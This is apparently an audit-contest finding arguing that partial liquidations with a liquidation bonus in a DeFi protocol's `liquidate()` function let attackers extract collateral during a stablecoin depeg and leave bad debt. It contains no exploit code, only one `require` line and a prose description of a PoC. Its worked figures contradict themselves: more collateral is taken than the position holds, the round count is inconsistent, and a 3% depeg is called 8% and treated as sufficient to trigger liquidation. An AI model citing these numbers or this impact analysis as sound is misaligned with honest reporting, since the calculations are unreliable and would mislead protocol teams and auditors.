## [H-01] partial liquidations in the `liquidate()` fucntion can leave the protocol with undercollateralized debt, harming users.
### Description

ln the liquidate() function in liquidationManager.sol, there is a design flaw that allows attackers to exploit partial liquidations during a stablecoin depeg event, profiting from each liquidation round while leaving the protocol with undercollateralized debt (bad debt), which harms its solvency.

My (PoC) demonstrates how an attacker would repeatedly liquidate a victim’s position after a simulated USDC price crash (from 1.00 to 0.40), taking advantage of the protocol’s liquidation bonus to extract more collateral than the debt repaid. This process drains the user’s collateral, leaving the protocol with debt that exceeds the remaining collateral’s value. The root cause lies in the protocol’s allowance of partial liquidations combined with a liquidation bonus that incentivizes attackers to perform multiple small liquidations.

P.S: In real-world scenarios, a smaller depeg (e.g., 5.6%)—as seen in historical events like the March 2023 USDC depeg—can trigger this vulnerability, making it highly exploitable.

### Finding Description
The liquidate function in liquidationManager.sol allows partial liquidations of a user’s debt when their position becomes undercollateralized (e.g., during a stablecoin depeg). The protocol offers a liquidation bonus (extra collateral) to incentivize liquidators, but this bonus can be exploited repeatedly through small, incremental liquidations. my PoC simulates a USDC price drop to $0.40 (a 60% depeg) just to make a victim’s position liquidatable, then shows an attacker performing multiple partial liquidations (100 jUSD each) to extract USDC collateral at a discount. Each liquidation yields a profit due to the bonus, and the repeated process can deplete the victim’s collateral, leaving the protocol with bad debt (debt greater than the collateral’s value). The root cause is the combination of:

Allowing partial liquidations, enabling attackers to liquidate small amounts repeatedly.

Providing a liquidation bonus, which gives attackers more collateral than the debt repaid.

### Impact Explanation
Victim’s Loss: The victim (a borrower) loses their collateral (USDC) at a discounted rate due to the liquidation bonus. I illustrated this in my PoC, the victim starts with 1200 USDC collateral and 800 jUSD debt. After multiple liquidations, their collateral is drained, potentially leaving them with no assets to cover remaining debt.

The attacker’s Profit: In each liquidation round by receiving more USDC collateral than the jUSD debt they repay. The PoC shows profits in each of up to 5 rounds.

Now note: The protocol enforces the liquidatebadDebt() fucntion to solve this issue, which is good but requires manual detection and intervention. Partial liquidations happen before owner intervenes and they extract value during the delay.

-Timeline:

1. Position becomes liquidatable
2. Attacker does multiple PARTIAL liquidations (using regular liquidate())
3. Each round extracts liquidator bonus
4. Position gradually becomes undercollateralized
5. [DELAY] Owner eventually notices and calls `liquidateBadDebt()`
6. Protocol absorbs remaining bad debt
Protocol’s Bad Debt: Repeated partial liquidations remove collateral faster than debt, leaving the victim’s position undercollateralized. For example, if 600 jUSD is liquidated, the attacker takes ~1666.68 USDC (6 * 277.78). With 200 jUSD debt and ~533.32 USDC collateral remaining (worth $213.33 at $0.40), the position is still solvent. However, further liquidations could leave insufficient collateral, creating bad debt (e.g., debt of 200 jUSD > collateral value of $150). This bad debt harms the protocol’s solvency, as it may lack funds to cover the shortfall, potentially leading to losses for other users or the protocol’s collapse.

### Likelihood Explanation
The likelihood of this vulnerability being exploited in a real-world scenario is **high ** due to the following factors: Historical Stablecoin Depegs:

my PoC notes that a 5.6% USDC depeg (to $0.944) is sufficient to trigger liquidations in a production environment (85% collateralization ratio + 5% buffer = 90% threshold). Historical events confirm this is realistic:

March 2023 USDC Depeg: USDC dropped to $0.87 (13% decline) due to Silicon Valley Bank’s collapse, a larger drop than needed

December 2022 USDD Depeg: USDD fell to $0.97, (8% decline), also sufficient to trigger liquidations.

Ease of Partial Liquidations:

The liquidate function allows partial liquidations (e.g., 100 jUSD out of 800 jUSD debt), with no limit on how many times an attacker can liquidate, making it easy to repeat the attack.

My PoC’s loop (up to 5 rounds) shows how attackers can automate multiple liquidations, a feasible strategy.

A user can just partially liquidate a position just to take bonus, leaving it for others. And can even be repeated by other users seeing this opportunity. but in the long-run, it affects the borrower/user.

### Root Cause
Partial Liquidations Allowed:
`require(_jUsdAmount <= ISharesRegistry(registryAddress).borrowed(holding), "2003");`

The `require(_jUsdAmount <= ...)` ensures the liquidation is valid but does not restrict it to full debt repayment, enabling the attacker to exploit the liquidation bonus multiple times by liquidating small amounts repeatedly.
### Recommendation (optional)
Avoid partial liquidations as this can cause harm to the protocol and users even if the protocl has a liquidateBadDebt fucntion. users would be harmed!
